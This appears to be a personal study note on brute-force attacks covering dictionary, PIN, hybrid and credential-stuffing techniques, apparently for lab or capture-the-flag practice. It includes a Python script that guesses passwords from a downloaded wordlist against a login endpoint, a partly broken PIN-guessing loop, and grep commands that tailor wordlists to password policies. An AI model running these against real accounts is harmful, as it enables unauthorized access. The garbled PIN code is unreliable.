# Brute Force Attacks

A [Brute-Force Attack](https://en.wikipedia.org/wiki/Brute-force_attack)
(*or exhaustive key search*)
is a [cryptanalytic attack](https://en.wikipedia.org/wiki/Cryptanalysis)
hat consists of an attacker submitting many possible keys
or passwords with the hope of eventually guessing correctly

> [!todo]

```sh
Possible Combinations = Character Set Size^Password Length
```

<!-- Dictionary Attack {{{-->
## Dictionary Attack

[Dictionary Attack](https://en.wikipedia.org/wiki/Dictionary_attack)
is using a pre-compiled list of words and phrases,
dramatically reducing the search space

> [!todo]

<!-- Example {{{-->
> [!example]-
>
>
> ```py
> #!/usr/bin/python3
>
> import requests
>
> ip = "127.0.0.1"  # Change this
> port = 1234       # Change this
>
> # Download a list of common passwords from the web and split it into lines
> passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()
>
> # Try each password from the list
> for password in passwords:
>     print(f"Attempted password: {password}")
>
>     # Send a POST request to the server with the password
>     response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
>
>     # Check if the server responds with success and contains the 'flag'
>     if response.ok and 'flag' in response.json():
>         print(f"Correct password found: {password}")
>         print(f"Flag: {response.json()['flag']}")
>         break

<!-- PIN {{{-->
## PIN

**Personal Identification Number**
(*[PIN](https://en.wikipedia.org/wiki/Personal_identification_number)*)
is a numeric passcode used in the process of authenticating a user

[[Python/General|Python]] —
Crack a four-digit pin code

<!-- Example {{{-->

> ip = "127.0.0.1"  # Change this
> port = 1234       # Change this
>
> # Try every possible 4-digit PIN (from 0000 to 9999)
> for pin in range(10000):
>     formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")

>
>     # Check if the server responds with success and the flag is found
>     if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)

<!-- Hybrid Attack {{{-->
## Hybrid Attack

**Hybrid Attack** typically merges a dictionary and a brute-force attack

- **Dictionary attack**: Using a list of potentially known credential matches
    (*e.g., wordlist*)
- **Brute-Force attack** Applies a brute-force attack upon each possible match

Hybrid attacks leverage the strengths
of both dictionary and brute-force techniques,
maximizing the chances of cracking passwords
(*especially when users fall into predictable patterns*)

**Password policy**

Hybrid attacks may use tailored wordlists
to target an organization's password policy

<!-- Info {{{-->
> [!info]-
>
> - Minimum 8 characters
> - Must include:
>   - At least one uppercase letter
>   - At least one lowercase letter
>   - At least one number
>
<!-- }}} -->

1. Filter for minimum password length

```sh
grep -E '^.{8,}$' <passwords.txt> > <passwords-len.txt>
```

2. Filter for at least one uppercase letter

```sh
grep -E '[A-Z]' <passwords-len.txt> > <passwords-upp.txt>
```

3. Filter for at least one lowercase letter

```sh
grep -E '[a-z]' <passwords-upp.txt> > <passwords-low.txt>
```

4. Filter for at least one number

```sh
grep -E '[0-9]' <passwords-low.txt> > <passwords-num.txt>
```

**Password-Change Policy**

Hybrid attacks may target an organization's password-change policy

<!-- Info {{{-->
> [!info]-
>
> An organization may enforce regular password changes
>
> ![[hybrid-attack.png]]
>
<!-- }}} -->

1. **Dictionary attack**:
   The attacker is launching a dictionary attack

2. **Dictionary attack**:
   The attack is unsuccessful

3. **Brute-Force attack**:
   The attacker modifies the words from the original wordlist

```sh
Summer2023 -> Summer2023!
```
```sh
Summer2023 -> Summer2024
```

<!-- Credential Stuffing {{{-->
## Credential Stuffing

[Credential Stuffing](https://en.wikipedia.org/wiki/Credential_stuffing)
is a type of cyberattack in which
the attacker collects stolen account credentials,
and uses them to gain unauthorized access to other systems
(*exploiting password reuse*)

<!-- Info {{{-->
> [!info]-
>
> ![[credential-stuffing.png]]
>
<!-- }}} -->

1. The attacker acquires compromised credentials

2. The attacker identifies potential target services
   (*e.g., social media, e-mail providers, etc.*)

3. The attacker tests the target via automated tools
